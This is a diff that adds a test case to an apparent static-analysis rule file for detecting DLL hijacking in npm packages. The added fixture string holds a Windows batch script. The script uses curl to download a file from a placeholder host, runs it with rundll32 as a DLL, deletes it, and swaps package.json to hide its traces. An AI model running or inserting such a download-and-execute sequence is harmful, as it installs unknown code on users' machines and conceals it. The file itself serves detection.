@@ -42,6 +42,14 @@ function f() {
   return;
 }
 
+// Running a DLL directly with rundll32
+function f() {
+    // ruleid: npm-dll-hijacking
+    const data = '@echo off\ncurl -o Temp.b -L "http://127.0.0.1/user/user.asp?id=237596" > nul 2>&1\nrename Temp.b package.db > nul 2>&1\nrundll32 package.db,GenerateKey 1234\ndel "package.db"\nif exist "pk.json" (\ndel "package.json" > nul 2>&1\nrename "pk.json" "package.json" > nul 2>&1\n)';
+
+    return;
+}
+
 // Phantom DLL case planting a shared object file and executing a builtin binary
 function f() {
   const fs = require("fs");
